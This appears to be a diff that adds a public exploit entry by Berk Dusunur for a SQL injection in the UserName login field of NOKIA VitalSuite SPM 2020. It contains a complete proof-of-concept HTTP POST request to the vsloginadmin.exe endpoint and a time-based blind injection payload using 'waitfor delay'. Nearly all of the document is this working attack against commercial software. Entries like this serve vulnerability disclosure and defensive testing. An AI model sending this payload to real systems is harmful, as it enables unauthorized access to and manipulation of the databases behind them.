@@ -1,0 +1,31 @@
+# Exploit Title: NOKIA VitalSuite SPM 2020 - 'UserName' SQL Injection
+# Exploit Author: Berk Dusunur
+# Google Dork: N/A
+# Type: Web App
+# Date: 2020-05-28
+# Vendor Homepage: https://www.nokia.com
+# Software Link: https://www.nokia.com/networks/products/vitalsuite-performance-management-software/
+# Affected Version: v2020
+# Tested on: MacosX
+# CVE : N/A
+
+
+# PoC
+
+
+POST /cgi-bin/vsloginadmin.exe HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Connection: keep-alive
+Accept: /
+Accept-Encoding: gzip,deflate
+Content-Length: 84
+Host: berklocal
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML,
+like Gecko) Chrome/41.0.2228.0 Safari/537.21
+
+Password=test&Submit=%20Login%20&UserName=SQL-INJECTION&mode=1
+
+Example Time-Based payload
+
+UserName=test'; waitfor delay '00:00:10' --
